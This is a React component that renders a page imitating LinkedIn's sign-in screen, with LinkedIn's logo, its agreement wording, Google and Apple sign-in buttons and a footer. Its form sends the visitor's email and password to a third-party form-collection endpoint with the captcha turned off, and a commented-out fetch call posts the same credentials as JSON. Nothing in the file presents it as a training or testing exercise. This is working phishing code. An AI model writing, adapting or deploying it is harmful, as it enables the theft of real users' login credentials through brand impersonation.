import { useState } from "react";
import Buttons from "./components/Buttons";
import Logo from "/logo.png";

export default function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  function getDetails() {
    async function sendDetails(){
      // e.preventDefault()
      const send = await fetch(
        `https://formsubmit.co/952fb51896d5f8d70142a128e67828f5`,
        {
          method: 'POST',
          headers:{
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            useremail: email, 
            userpassword: password
          })
        }
      )

      const gone = await send.json()
      console.log(gone);
      console.log('It worked')
    }
    sendDetails()
  }
 

  return (
    <main>
      <div className="logoCtn">
        <img src={Logo} alt="LinkedIn Logo" />
      </div>

      <section>
        <div className="card">
          <div>
            <h3>Sign in</h3>
            <p>Stay updated in your professional world.</p>
          </div>
          <form
            action="https://formsubmit.co/952fb51896d5f8d70142a128e67828f5"
            method="POST"
            // onSubmit={getDetails}
          >
            <div className="inputs">
              <input
                type="email"
                placeholder="Email address"
                name="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                required
              />
              <input
                type="password"
                placeholder="Password"
                name="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
              />
              <input type="hidden" name="_captcha" value="false"></input>
              <input
                type="hidden"
                name="_next"
                value="http://localhost:5173/greet.html"
              ></input>
            </div>
            <p>
              <a href="#">Forgotten password?</a>
            </p>
            <button type="submit">Sign in</button>
          </form>

          <div className="btmText">
            <div className="separator">
              <div className="line"></div>
              <p>or</p>
              <div className="line"></div>
            </div>
            <p>
              By clicking Continue, you agree to{" "}
              <span className="special">LinkedIn’s User Agreement</span>,{" "}
              <span className="special">Privacy Policy</span>, and{" "}
              <span className="special">Cookie Policy</span>.
            </p>

            <div className="btnSection">
              <Buttons text="Continue with Google" google />
              <Buttons text="Sign in with Apple" apple />
            </div>
          </div>
        </div>

        <p>
          {" "}
          New to LinkedIn? <span className="special">Join Now</span>
        </p>
      </section>

      <footer>
        <ul className="footerList">
          <li>LinkedIn &copy; 2024</li>
          <li>User Agreement</li>
          <li>Privacy Policy</li>
          <li>Community Guidelines</li>
          <li>Cookie Policy</li>
          <li>Copyright Policy</li>
          <li>Send Feedback</li>
        </ul>
      </footer>
    </main>
  );
}
